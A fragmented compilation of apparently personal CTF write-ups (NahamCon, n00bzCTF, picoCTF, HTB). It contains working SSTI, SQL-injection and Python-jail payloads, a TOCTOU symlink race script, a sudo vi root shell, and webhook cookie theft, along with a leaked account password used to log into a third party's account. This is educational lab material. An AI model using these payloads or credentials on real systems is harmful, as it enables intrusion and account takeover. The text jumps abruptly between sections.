Sheep Meadow street view:\nOnce again, finding the same view location as the challenge:\nflag{aa1b04ee3ded3a7c3ee16be1ff85e99c}\nChall4 Author: @Gary#4657\nHead over to https://osint.golf and select chall4 under the NahamCon2023 category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!\nNOTE: The integrated compass direction is inconsistent with the actual panorama representation.\nIn the final Geosint challenge, we are given a drone shot of what seems to be a suburban area setting. We are too far away do identify anything such as the language on signs or country flags, but we can note the very large number of train track lanes. Some buildings in the distance appear to have uncommon architecture, but not enough for me to draw any conclusions. My first guess is to take the most eye-catching building and see what image searches can do for me.\nFrom this image, it was quickly identified as Bratislava Castle of Bratislava, Slovakia. This location does not match geographically, but the building\u0026rsquo;s design and colors match very well. The second building I searched for is the neighboring church-like building.\nThere were several identical matches for seemingly different buildings. However, one in particular mentions a castle with it in combination. this web posting seems to be reviewing it as a bike trail. Examining the geography in a google map search for Schloss Ebenfurth, it instantly became clear that this is the same location as the challenge.\nI was unable to find the same capture on Google Maps, but since this is an arial view, we can get a pretty good idea where it might be without too much trouble.\nflag{2e57cfe16d7e1c5431aa3b99d0e713cb}\nWeb Hidden Figures Author: @JohnHammond#6971\nLook at this fan page I made for the Hidden Figures movie and website! Not everything is what it seems!\nEntering the website we see a pretty well-constructed page promoting Hidden Figures, a pretty popular book/movie. None of the links take us to other pages, so there is little to be explored. Early on, I noticed that folder directory /assets/ is free to view. I thought perhaps there might be something hidden here, or in another commonly used folder type?\nAfter some lengthy enumeration, I found nothing of interest.\nLooking at the page source, I noticed that there are several links with very long url codes:\n1 2 data:image/png;base64,/9j/4AAQSkZJRgABAQEBLAEsAAD/7RqcUGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAFocAVoAAxslRxwCAAACAAAcAngAFVdvbWFuIG9mIE5BU0EgTGFuZ2xleRwCVQAPRGF2aWQgQy4gQm93bWFuHAI3AAgyMDE0MDMyMBwCPAALMDkxNTA2KzAwMDA4QklNBCUAAAAAABBbRWm4H1TKYVo1ObYsy6/POEJJTQQ6AAAAAAESAAAAEAAAAAEAAAAAAAtwcmludE91dHB1dAAAAAUAAAAAUHN0U2Jvb2wBAAAAAEludGVlbnVtAAAAAEludGUAAAAASW1nIAAAAA9wcmludFNpeHRlZW5CaXRib29sAAAAAAtwcmludGVyTmFtZVRFWFQAAAAWAEUAUABTAE8ATgAgAFMAdAB5AGwAdQBzACAAUAByAG8AIAA3ADkAMAAwAAAAAAAPcHJpbnRQcm9vZlNldHVwT2JqYwAAAAwAUAByAG8AbwBmACAAUwBlAHQAdQBwAAAAAAAKcHJvb2ZTZXR1cAAAAAEAAAAAQmx0bmVudW0AAAAMYnVpbHRpblByb29mAAAADHByb29mTW9uaXRvcjhCSU0EOwAAAAACLQAAABAAAAABAAAAAAAScHJpbnRPdXRwdXRPcHRpb25zAAAAFwAAAABDcHRuYm9vbAAAAAAAQ2xicmJvb2wAAAAAAFJnc01ib29sAAAAAABDcm5DYm9vbAAAAAAAQ250Q2Jvb2wAAAAAAExibHNib29sAAAAAABOZ3R2Ym9vbAAAAAAARW1sRGJvb2wAAAAAAEludHJib29sAAAAAABCY2tnT2JqYwAAAAEAAAAAAABSR0JDAAAAAwAAAABSZCAgZG91YkBv4AAAAAAAAAAAAEdybiBkb3ViQG/gAAAAAAAAAAAAQmwgIGRvdWJAb+AAAAAAAAAAAA \u0026lt;...SNIP...\u0026gt; And so on. I didn\u0026rsquo;t know this was possible or ever really done, but it appears that some websites might provide their images in base64 encoded data like this so that images can be loaded without retrieving data from other pages. This seems to be what is going on here, as following the link takes me to an image regardless of the website\u0026rsquo;s running state.\nEventually I thought to download each of the images located on the website. While reviewing this challenge I discovered that saving the image directly is enough, but at the time I had decided to copy/paste the entire url into a file. After removing data:image/png;base64, I base64 decoded the info:\n1 $ cat url | base64 -d \u0026gt; decode_url And so on, for all 4 images found.\nChecking exiftool didn\u0026rsquo;t give me any critical information, however binwalk did show me something hidden in the figures.\n1 2 3 4 5 6 7 $ binwalk decode_url2 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 15486 0x3C7E PNG image, 1851 x 174, 8-bit/color RGB, non-interlaced 15527 0x3CA7 Zlib compressed data, default compression There is another image hidden here, and potentially some compressed data?

After trying and failing a few easy guesses like admin:admin, I made my own account with username asdf.

And so, when a victim views this page, the image will attempt to be loaded by visiting my webhook. The webhook will log the request information and with it, I will be able to see whatever cookies are associated with the victim\u0026rsquo;s session.\nIndeed we see a cookie: x-wing=eyJfcGVybWFuZW50Ijp0cnVlLCJpZCI6MX0.ZIvRmQ.20AcIM9F-Kg8q21j8Pc4mVl2aO0\nBy substituting our X-wing cookie for this one, we become admin.

Once I asked him the wifi password he gave me some numbers like 186808155710 and told me that the number are in group of two like 1008 -\u0026gt; 10 and 08/8. Can you help to gather the wifi password? (Note: It forms a complete word, so you might have to leave out something).\nFlag format: n00bz{the_password_in_lower_case} Author: noob_abhinav\nBased on the description, this password is likely linked to periodic table elements. We are also told that the password represents a real word, so the element letters might not exactly translate to the answer.\nFrom 186808155710 we can separate into elements: 18 68 08 15 57 10 Using periodic table, element letters are as follows: ar er o p la ne indeed areroplane doesn\u0026rsquo;t work, however this looks similar to the word aeroplane.

Also note that flag is case sensitive! Note: Due to a quite big range of answers, to narrow down your search, use the latitude and longitude provided from this site: blog.jatan.space This presented image appears to be a 3D rendering of a moon landing plan. The first easy check to be done is a reverse image search in google, and see what articles are discussing this event. Very quickly I see an article that uses the image discussing a failed landing for India\u0026rsquo;s moon mission titled Chandrayaan 2. The lander for this mission appears to be called Vikram, and the rover called Pragyan. This info is part of the flag, but we still need to find the exact coordinates of the planned landing. With a mission name in mind, I visited the blog.jatan.space site mentioned, and searched for Chandrayaan 2. On this page I learned the coordinates planned for the landing: 70.9S, 22.8E.\nNow we can construct and submit the flag as n00bz{Vikram_Pragyan_70.9_22.8}.\nTry to hack me My friend brayannoob gave me a ctf challenge and told me Try to hack me.\nA google search on brayannoob did not yield any interesting results, so I decided to switch search engines. Upon using Bing, a github account was among the first results, very interesting. The repositories within this github we see a n00bzCTF-2022 writeup. With relevance on our side, this is clearly related to the challenge. Exploring the newest repository, BrayanResearch, I uncovered user credentials from an older edit of the README.md file:\n1 2 3 4 \u0026lt;!-- ACCOUNT CREDENTIALS --\u0026gt;| \u0026lt;!-- USERNAME - @brayanduarte.noob --\u0026gt;| \u0026lt;!-- PASSWORD - Brayann00b@2023 --\u0026gt; # THANK YOU :love: Other edits also give light to potential usernames:\n1 \u0026lt;!-- username : @brayan24 --\u0026gt; and in the current readme:\n1 \u0026lt;!-- username : brayan234 --\u0026gt; We have potential usernames and a password, but which service these are for? It is not so clear.\nThis github repo supplies a demo, providing a link to replit.com. After searching for a little bit, we come across this user.. Using the provided password, I was able to log in and \u0026ldquo;hack\u0026rdquo; this account! However, after searching for quite some time, I was unable to find the flag. Reviewing the CTF discord channel, there is an announcement that breaching this account was unintended for the challenge. I suppose this little adventure may serve to emphasize how easy it might be to accidentally leak credentials on github or other services!\nFrom the discord message we know the password login is irrelevant, time to think on the hints provided in the prompt again. Looking at the Try to hack me part, it makes me think of the popular web service TryHackMe. After looking through usernames we stumble upon a certain username from our list: brayan234. Looking at this account, it appears we didn\u0026rsquo;t need to log in at all!

These are common python functions, suggesting a python code injection. Exploring where our input is used, we have this line:\n1 render_template_string(f\u0026#39;\u0026lt;p\u0026gt;Haha! No certificate for {name}\u0026lt;/p\u0026gt;\u0026#39;) A very quick google search suggests this might be SSTI, which is reasonable to believe based on the blacklist. We must utilize SSTI to display the contents of flag.txt. Among the commonly used SSTI functions present within the blacklist, we even see flag.txt is among them.\nBypassing blacklist It is clear that this blacklist must be bypassed. One possible approach is to use quotations to break string sequences. Onsra03 proposes {{namespace['__ini''t__']['__global''s__']['o''s']['pop''en']('l\\s')['rea''d'](+)}}. However, with this we quickly approach the 70 char limit.\nFrom the source code it is worth pointing out that only the parameter name is checked for blacklisted characters. If we can supply blacklisted characters in team_name\u0026ndash; or perhaps an unused parameter\u0026ndash;then call team_name again within name, we should be able to pass the blacklisted characters to execute.\nBuilding payload Using global variable g, we can generate a much smaller payload from namespace[__ini''t__]. Secondly, we can utilize request.form to reference a different supplied parameter containing banned strings. At this point, our payload is small enough that referencing team_name is still within the length requirements. However, we could make the name parameter even smaller by referencing some single letter parameter such as a:\n1 name={{g.pop[\u0026#39;__global\u0026#39;\u0026#39;s__\u0026#39;].__builtins__.eval(request.form.team_name)}}\u0026amp;team_name=__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat flag.txt\u0026#39;).read() Supplying this as the post request body:\n1 2 curl -X POST http://challs.n00bzunit3d.xyz:52130/generate -d \u0026#34;name={{g.pop[\u0026#39;__global\u0026#39;\u0026#39;s__\u0026#39;].__builtins__.eval(request.form.team_name)}}\u0026amp;team_name=__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat flag.txt\u0026#39;).read()\u0026#34; \u0026lt;p\u0026gt;Haha! No certificate for n00bz{5571_57r1k3s_4g41n_7a1b3f4e5d}\u0026lt;/p\u0026gt; Alternative payload Another interesting approach does not use g.pop but instead utilizes Flask\u0026rsquo;s get_flashed_messages function:\n1 name={{get_flashed_messages[\u0026#39;__built\u0026#39;\u0026#39;ins__\u0026#39;].eval(request.values[\u0026#39;a\u0026#39;])}}\u0026amp;a=__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat flag.txt\u0026#39;).read()\u0026amp;team_name=b Note that in this situation referencing team_name in request.values will exceed the input length limit, so we utilize a single letter parameter a instead. The values for team_name doesn\u0026rsquo;t matter anymore, so it\u0026rsquo;s just set to b.\n","date":"2023-06-14T20:25:09-05:00","permalink":"https://yuwenmichael.netlify.app/post/n00bzctf_2023/","title":"N00bzCTF_2023"},{"content":"Binary Exploitation tic-tac Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it. ssh to saturn.picoctf.net:62983, and run the binary named \u0026ldquo;txtreader\u0026rdquo; once connected.

If we are allowed to view, it will read the file contents. It\u0026rsquo;s also worth noting that txtreader has SUID bit set, allowing it to run as root when we use:\n1 2 $ ls -l txtreader -rwsr-xr-x 1 root root 19016 Mar 16 02:28 txtreader If we can send the textreader to open a file we have permissions on, then quickly swap it with a file linked to the flag, we should be able to trick the program into reading the flag contents for us. This is known as a Race Condition, or TOCTOU type of problem. This video by John Hammond covers a similar CTF challenge, and the solution can be done with the same approach. 1. We will create our own file called link with touch, that we can read/write to. 2. We will start txtreader, and tell it to read link, which is owned by us. 3. txtreader will check the file, and confirm we have permission to read the file 4. We will delete link, and create a new link file that is symlinked to flag.txt. Now when things want to interact with link, they are pointed to flag.txt 5. txtreader will attempt to read link, except it now points to flag.txt. Since it already confirmed we have permissions, it will output the contents of flag.txt Since txtreader won\u0026rsquo;t be waiting for us to manipulate the files in between actions, we have to be very fast, hence the race aspect. Our human action speeds aren\u0026rsquo;t nearly good enough, so what we can do is loop the action of swapping link , while also looping the run of txtreader. After enough runs, hopefully our action timings will line up and we can get the flag. Making the link loop, linker.sh:\n1 2 3 4 5 6 7 while true do rm link touch link rm link ln -s /home/ctf-player/flag.txt link done Setting up the linker loop and running txtreader:\n1 2 3 4 5 6 7 8 9 ctf-player@pico-chall$ chmod +x linker.sh ctf-player@pico-chall$ ./linker.sh rm: cannot remove \u0026#39;link\u0026#39;: No such file or directory ^Z [1]+ Stopped ./linker.sh ctf-player@pico-chall$ bg 1 [1]+ ./linker.sh \u0026amp; ctf-player@pico-chall$ while [ 1 ]; do ./txtreader link; done 2\u0026gt;/dev/null picoCTF{ToctoU_!s_3a5y_f482a247} Overall while this method works, it is not very reliable. Sometimes you can get lucky and the flag is read after a few minutes of running, other times it had not succeeded once in the full 15min duration of the instance.\npicoCTF{ToctoU_!s_3a5y_f482a247}\nPotential Solution\u0026ndash;Reliable race fixing? It might be possible to \u0026ldquo;fix\u0026rdquo; the race for us, resulting in very reliable success of flag read. This post describes using a filesystem maze too large for the system to handle in memory at once, allowing for a more clear window of opportunity for us to switch targets. The maze consists of many nested folders, containing symlinks pointing to another batch of nested folders. After repeating for x times, the final link points to the file we own. The maze is too large to be placed in the filesystem cache, and this process results in slower navigation and an increased delay between the action of checking permissions and the action of reading the file contents.\nWhile I did not have time to utilize this trick on tic-tac, it might be worth exploring on another CTF challenge.\ntwo-sum Can you solve this?

Since blockchain transactions are publicly disclosed, we can view the activity associated with this wallet on a quick Google search.\nwww.bitcoinabuse.com is a website dedicated to tracking bitcoin addresses used in ransomeware and blackmailings, so if our address was used in other previous attacks, we can find reports for our given address.\nSearching this address we see several reports for multiple abuse types. Since we know our friend had been hacked, the abuse type is likely a ransomeware attack. The first report against this address is labeled ransomeware, and provides a link where we might learn more:\nMore information here: https://blog.avira.com/petya-strikes-back/\nThe title of the article plainly tells us the malware at play is based on the infamous ransomeware Petya, but we can also follow the link to learn more about it.\nWe are told the answer to the flag is the malware involved, so we can submit the flag by inserting \u0026ldquo;Petya\u0026rdquo; into the picoCTF flag format. picoCTF{Petya}\nPermissions Can you read files in the root file?\nAdditional details will be available after launching your challenge instance.\nThis challenge asks us to read a file in the /root directory. Files located here are typically under the highest access protections possible, requiring only root permissions and rejecting any other non-super user.\nFirstly, we are required to connect to the challenge machine via ssh:\n1 $ ssh picoplayer@saturn.picoctf.net -p PORT The port number is customized to your own launched instances.\nFirstly, we can check our own user privileges:\n1 2 picoplayer@challenge:~$ id uid=1000(picoplayer) gid=1000(picoplayer) groups=1000(picoplayer) We can see we are not a part of root in any way, uid gid or part of the root group. It is unlikely we can access /root, so it is unsurprising to see we are denied:\n1 2 picoplayer@challenge:/$ cd /root -bash: cd: /root: Permission denied We need to find a way to elevate our permissions before we can go here.\nA common approach to elevating privileges is to do super-user actions, through the command sudo. Users are often limited in the kinds of sudo actions they can do. We can check what is allowed for our user by typing sudo -l:\n1 2 3 4 5 6 7 picoplayer@challenge:/$ sudo -l Matching Defaults entries for picoplayer on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User picoplayer may run the following commands on challenge: (ALL) /usr/bin/vi Notably, we can run /usr/bin/vi as any user, including root, as noted by the (ALL). vi is a common text editor used to edit files. Since we are interested in reading the contents of a file, opening the file using vi is enough to tell us what\u0026rsquo;s inside.\n1 picoplayer@challenge:/$ sudo vi /root/flag.txt However, when we do this we don\u0026rsquo;t see anything? This is because even though we know the location of the flag, we are still guessing if it is called flag.txt or something else. We need a way to explore the contents of the /root directory.\nWhile vi has the main purpose of being a text editor, we can also abuse some of it\u0026rsquo;s other features to obtain an interactive terminal session as user root:\n1 sudo vi -c \u0026#39;:!/bin/bash\u0026#39; Here, we launch vi with sudo vi. With -c flag, we specify a command :!/bin/bash for vi to run on launch. Alternatively, we can do this ourselves after launching vi. Simply typing :shell will open a shell session as the current user, in this case, root.\nNow we can access /root:\n1 2 root@challenge:~# ls root@challenge:~# Typing ls shows no file in root? The challenge description mentions reading files in root, so surely something must be here:\n1 2 root@challenge:~# ls -a . .. .bashrc .flag.txt .profile By adding -a flag to ls we can see hidden files. There is our flag, under .flag.txt. So, the reason we couldn\u0026rsquo;t find it earlier was because the name was indeed different from what we expected. We can revisit to see that, once the proper name is supplied, vi could have been used to view file contents:\n1 picoplayer@challenge:~$ sudo vi /root/.flag.txt 1 2 3 picoCTF{uS1ng_v1m_3dit0r_021d10ab} ~ ~ Repititions Can you make sense of this file? Download the file here.\nHere we are tasked with making sense of a file. Following the link prompts us to download a file called enc_flag. Enc is almost certainly shorthand for encoded, meaning our flag will probably need to go through some decoding processes.\n1 2 3 4 5 6 $ cat enc_flag VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVh RmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNk MlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVW VkpEVGxaYVdFMVhSbFZrTTBKVVZXcE9VazFXV2toT1dHUllDbUY2UWpSWk1GWlhWa2RHZEdWRlZs aGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg== Dumping the contents in plaintext, we can see that it is clearly not human-readable. A string such as this, ending with =, is very likely encoded with base64. We can use an online decoding tool such as CyberChef to get through this quickly, or we can use the linux command base64 to do this as well:\n1 2 3 4 5 $ cat enc_flag | base64 -d VjFSQ2EyTXlSblJUV0dSVllrWmFWRmx0TlZOalJtUlhZVVU1YVZKVVZuaFdWekZoWVZkR2NrNVVX bUZTVmtwUVdWUkdibVZXVm5WUgpiSEJzWVRCd2VWVXhXbXBOUlRWSFdqTnNWZ3BYUjFKeVZGZHdW MlZzVWxaVmJFNW9UVVJDTlZaWE1XRlVkM0JUVWpOUk1WWkhOWGRYCmF6QjRZMFZXVkdGdGVFVlhi bTkzVDFWT2JsQlVNRXNLCg== From our cat output we use | to redirect straight to another command, base64. Setting -d means the data will be base64 decoded. Despite this, the data is still unreadable. And we still see it ending in =? It appears the flag has been through multiple layers of encoding. We can decode for multiple rounds through the same method as before:\n1 2 $ cat enc_flag | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_492767d2} Finally after 6 rounds of decoding, the flag appears in plaintext.\nSpecial Don\u0026rsquo;t power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized\u0026hellip; automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That\u0026rsquo;s Special (TM) Start your instance to see connection details.\nAdditional details will be available after launching your challenge instance.\nWhen we first enter, we might be inclined to check what is in our home:\n1 2 3 Special$ ls Is sh: 1: Is: not found Our ls command is converted to Is, and then fails to execute. Checking a few other commands leads all syntax being altered to similar legitimate words, and all of them starting with capitilization. With our syntax ruined, we cannot execute commands properly! If we attempt to enter a different shell terminal, we receive an interesting rejection:\n1 2 Special$ bash Why go back to an inferior shell? My first thought is if my input is being altered after input but before bash processing, perhaps I can use characters designated to escaping metacharacter interpretation. In bash, the backslash \\ character is used to escape regular interpretations, and generally treats the character as raw text.\n1 2 3 Special$ \\ls Als sh: 1: Als: not found Unfortunately, trying to escape the l in ls, which was previously converted to I, produces something completely different. Trying again with other commands, I manage to execute whoami. Perhaps I am on to something?\n1 2 3 Special$ \\whoami \\whoami ctf-player As it stands currently, we are escaping only 1 character, but the others are still treated as regular components of a string. What if we escape every character?\n1 2 3 Special$ \\e\\c\\h\\o test \\e\\c\\h\\o test test We can successfully perform echo! However, for some strange reason ls is not working:\n1 2 3 Special$ \\l\\s Plus sh: 1: Plus: not found Perhaps the problem is caused by ls being only 2 characters? Regardless, we have other ways to look around:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Special$ \\d\\i\\r \\d\\i\\r blargh Special$ \\c\\a\\t \\b\\l\\a\\r\\g\\h \\c\\a\\t \\b\\l\\a\\r\\g\\h cat: blargh: Is a directory Special$ \\d\\i\\r \\b\\l\\a\\r\\g\\h \\d\\i\\r \\b\\l\\a\\r\\g\\h flag.txt Special$ \\c\\a\\t \\b\\l\\a\\r\\g\\h\\/\\f\\l\\a\\g\\.\\t\\x\\t \\c\\a\\t \\b\\l\\a\\r\\g\\h\\/\\f\\l\\a\\g\\.\\t\\x\\t picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6} While this approached works, it is rather tedious and ugly. We can escape this special shell by invoking bash:\n1 2 3 4 Special$ \\b\\a\\s\\h \\b\\a\\s\\h ctf-player@challenge:~$ whoami ctf-player Now we are free!\nSpecialer Reception of Special has been cool to say the least. That\u0026rsquo;s why we made an exclusive version of Special, called Secure Comprehensive Interface for Affecting Linux Empirically Rad, or just \u0026lsquo;Specialer\u0026rsquo;. With Specialer, we really tried to remove the distractions from using a shell. Yes, we took out spell checker because of everybody\u0026rsquo;s complaining. But we think you will be excited about our new, reduced feature set for keeping you focused on what needs it the most. Please start an instance to test your very own copy of Specialer.\nAdditional details will be available after launching your challenge instance.\nUpon entering, we might want to look around. However, we instantly come up with a problem:\n1 2 Specialer$ ls -bash: ls: command not found From the looks of it, ls is not accessible in our PATH. Specifying the full path does not help, and we soon find that we may not have access to any binaries:\n1 2 3 4 Specialer$ /usr/bin/ls -bash: /usr/bin/ls: No such file or directory Specialer$ locate ls -bash: locate: command not found Using tab auto-complete to navigate, we can see we are in a very restricted environment, and the only binary available is bash:\n1 2 3 Specialer$ cd / bin/ home/ lib/ lib64/ Specialer$ cd /bin/bash Note: Tabbing at / suggests bin, home, lib and lib64. Tabbing at /bin/ auto suggessts bash. This must be the only file in the directory.\nAt least with bash, we still have access to built-ins. Since our terminal commands are so limited, we can actually list them all by pressing tab twice on an empty line:\n1 2 3 4 5 6 7 8 9 10 11 12 Specialer$ ! builtin dirs exit history pushd suspend unalias ./ caller disown export if pwd test unset : case do false in read then until [ cd done fc jobs readarray time wait [[ command echo fg kill readonly times while ]] compgen elif fi let return trap { alias complete else for local select true } bash compopt enable function logout set type bg continue esac getopts mapfile shift typeset bind coproc eval hash popd shopt ulimit break declare exec help printf source umask We can utilize echo to see one directory layer at a time:\n1 2 3 4 5 Specialer$ echo * abra ala sim Specialer$ echo */* abra/cadabra.txt abra/cadaniel.txt ala/kazam.txt ala/mode.txt sim/city.txt sim/salabim.txt We have several txt files here to view, but unfortunately no common binary to read them with. Bash also comes with a read built-in, combined with echo, we can output contents within files\n1 2 Specialer$ read IFR \u0026lt; abra/cadabra.txt; echo $IFR Nothing up my sleeve! Now that the contents are displayed, perhaps one option can give us a flag?\n1 2 Specialer$ read IFR \u0026lt; ala/kazam.txt; echo $IFR return 0 picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_38f5cc78} Useless There\u0026rsquo;s an interesting script in the user\u0026rsquo;s home directory\nAdditional details will be available after launching your challenge instance.\nFor this challenge we are given a simple script, and told to explore the script to obtain the flag.\nFirstly, we are required to connect to the challenge machine via ssh:\n1 $ ssh picoplayer@saturn.picoctf.net -p PORT The port number is customized to your own launched instances.\nwe see the script in our home directory, with executable premissions:\n1 2 3 4 5 6 7 8 9 picoplayer@challenge:~$ ls -al total 16 drwxr-xr-x 1 picoplayer picoplayer 20 Mar 17 18:38 . drwxr-xr-x 1 root root 24 Mar 16 02:30 .. -rw-r--r-- 1 picoplayer picoplayer 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25 2020 .bashrc drwx------ 2 picoplayer picoplayer 34 Mar 17 18:38 .cache -rw-r--r-- 1 picoplayer picoplayer 807 Feb 25 2020 .profile -rwxr-xr-x 1 root root 517 Mar 16 01:30 useless First, we check the kind of file we are working with:\n1 2 picoplayer@challenge:~$ file useless useless: Bourne-Again shell script, ASCII text executable This is a bash script, written in plaintext.

The website running here\nUpon logging in, we cycle through a couple blank pages very quickly before landing at http://saturn.picoctf.net:54197/home. The page contains a search bar and a small note: \u0026ldquo;I was redirected here by a friend of mine but i couldnt find anything. Help me search for flags :-)\u0026rdquo;\nSearching for a few keywords leads us to no result. The note on this page mentions the redirects as well, so let\u0026rsquo;s use burpsuite to catch and analyze each step that\u0026rsquo;s occuring. First login request:\nFirst redirect:\nSecond redirect:\nThen finally we are sent to home.

Combining the two id values together and base64 decoding might get us the flag:\n1 2 echo \u0026#34;cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzAxZTc0OGRifQ==\u0026#34; | base64 -d picoCTF{proxies_all_the_way_01e748db} MatchTheRegex How about trying to match a regular expression The website is running here.\nGoing to the page, we see an input box to input our search. Based on the name, my first thought is that this will be a regular expression search, where we must input a regex term that will hit positive for specifically the flag. After trying several different regex queries, I\u0026rsquo;m not having any luck. Looking at the page source, I notice a hint displayed in comments:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; function send_request() { let val = document.getElementById(\u0026#34;name\u0026#34;).value; // ^p.....F!? fetch(`/flag?input=${val}`) .then(res =\u0026gt; res.text()) .then(res =\u0026gt; { const res_json = JSON.parse(res); alert(res_json.flag) return false; }) return false; } \u0026lt;/script\u0026gt; ^p.....F!? In regex searches, ^ refers to the start of a line and $ refers to the end of a line, so perhaps this hint can be a working query?\nUnfortunately not.. Playing with the provided hint a little more, I get a successful match by being more generic:\nDespite being a regex based search, and the commented page source including the ^ marker for the beginning of a line, including the ^ in our search causes it to fail.. picoCTF{succ3ssfully_matchtheregex_f89ea585}\nMore_SQLi Can you find the flag on this website. Try to find the flag here\nThanks to sergyperov for the helpful writeup!\nEntering the site we see a login page. Considering the name of the challenge, we will start with a simple SQL injection payload: 'or 1=1-- On the first attempt with a random input, we get an error. This is more useful than usual, however, as it tells us the SQL query happening in the background:\n1 2 3 username: \u0026#39;or 1=1-- password: 345534 SQL query: SELECT id FROM users WHERE password = \u0026#39;345534\u0026#39; AND username = \u0026#39;\u0026#39;or 1=1-- \u0026#39; Since password is being called first, we can insert our injection into this field and it should work. After bypassing login, we see a table of information:\nThere\u0026rsquo;s no flag here, but one of the addresses seems to be a little interesting: \u0026ldquo;Maybe all the tables\u0026rdquo;. Doing our regular SQL injection 'or 1=1-- in the search bar results in the same information. It appears that although we are dumping all information from the current table, the flag is actually in a different table? In order to dump information in other tables we will look into UNION injections.\nFirst to explore union injections, we need to know the number of columns in this table. With this challenge, we can clearly see three tables, but just to be sure, we will check a UNION injection including 3 columns. If the column number doesn\u0026rsquo;t match the SQL query, the search will fail.\n1 Kampala\u0026#39; UNION SELECT NULL,NULL,NULL-- Note that choosing Kampala to search isn\u0026rsquo;t required, but it can make it easier to see our row of NULLs between it and the City/Address/Phone header.\nFrom here, we need to know which columns might be text injectable. Since city and address contain strings, these two are likely, however phone consists of numbers so possibly not the third column. Testing all 3 at once:\n1 Kampala\u0026#39; UNION SELECT \u0026#34;abc\u0026#34;,\u0026#34;abc\u0026#34;,\u0026#34;abc\u0026#34;-- All three columns return our injected string, meaning we can dump information out of any of these three columns. Note you only need one column working to proceed with union injection, and also if you try injecting your string into a column that cannot take string values then the entire SQL query fails.\nProbing the SQL tables:\n1 Kampala\u0026#39; UNION SELECT sql,NULL,NULL from sqlite_master LIMIT 1,5; -- by pulling sql from sqlite_master, we can see a total of 4 tables:\nhints more_table offices users Normally users would be the most interesting for us, but our hint about \u0026ldquo;Maybe all the tables\u0026rdquo; is hinting towards the more_tables table first. We can check each table by using the same type of UNION injection. Note that this table list output also gives us the column names: id and flag. Another reason to try this table first.\n1 Kampala\u0026#39; UNION SELECT id,flag,NULL from more_table where 1=1-- And with that, we have our flag. picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}\nSOAP The web project was rushed and no security assessment was done.

We must rely on these builtin functions to escape the jail and find our flag. A list of builtin functions can be found here. Input() caught my eye, as perhaps we can supply stdin that might not be checked through the blacklist:\n1 2 3 4 5 \u0026gt; a=input() [*] Input accepted! Error: invalid syntax (\u0026lt;string\u0026gt;, line 1) Unfortunately, I received an error before being able to input anything for variable declaration. However, trying input() on its own seems to work as I expected:\n1 2 3 4 5 6 \u0026gt; input() [*] Input accepted! \u0026#39;\u0026#34;\u0026#39;\u0026#34;Test aWE$% \u0026gt; Here we see no blacklist notice despite putting several blacklisted characters. Perhaps we can use input in a different way?

From here there are several ways to read a flag. Since I wasn\u0026rsquo;t sure what the flag was named or where it might be, I decided to create a shell session using a gtfobins payload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026gt; exec(input()) [*] Input accepted! import os; os.system(\u0026#34;/bin/sh\u0026#34;) whoami ctf ls flag.txt jail.py cat flag.txt HTB{y0u_d3f34t3d_th3_sn4k3_g0d!} HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}\nPersistence Thousands of years ago, sending a GET request to /flag would grant immense power and wisdom. Now it\u0026rsquo;s broken and usually returns random data, but keep trying, and you might get lucky\u0026hellip; Legends say it works once every 1000 tries. Difficulty: very easy\nThe objective for this problem is very straightforward: send a /GET request to IP:PORT/flag and you will receive the flag after ~1000 attempts. 1000 attempts is a rather high number to reach manually, so creating a loop for curl is the way to go:\n1 2 3 4 5 #!/bin/bash for i in {1..1000} do curl -s 165.232.100.46:31980/flag done -s flag makes the curl request silent, otherwise we will get transmission informations on every curl attempt. This loop only runs for 1000 attempts, but if you\u0026rsquo;re watching the program you can have it set to run indefinitely and just manually close it when the flag is seen. Running the script:\n1 2 $ chmod +x loop.sh $ ./loop.sh | grep \u0026#34;HTB\u0026#34; grep allows us to filter any uninteresting output and only shows our flag. Eventually, we see the results pop out at us.\n1 HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}jW\u0026amp;z3]X8CLb5Q7kR The flag information includes only HTB and the content in brackets. A cleaner grep would have extracted only the flag. Overall, it seems output of the flag is based on a ~0.1% chance. On average, you will get the flag within 1000 requests but not always. HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}\nRestricted You \u0026rsquo;re still trying to collect information for your research on the alien relic. Scientists contained the memories of ancient egyptian mummies into small chips, where they could store and replay them at will. Many of these mummies were part of the battle against the aliens and you suspect their memories may reveal hints to the location of the relic and the underground vessels. You managed to get your hands on one of these chips but after you connected to it, any attempt to access its internal data proved futile. The software containing all these memories seems to be running on a restricted environment which limits your access. Can you find a way to escape the restricted environment?

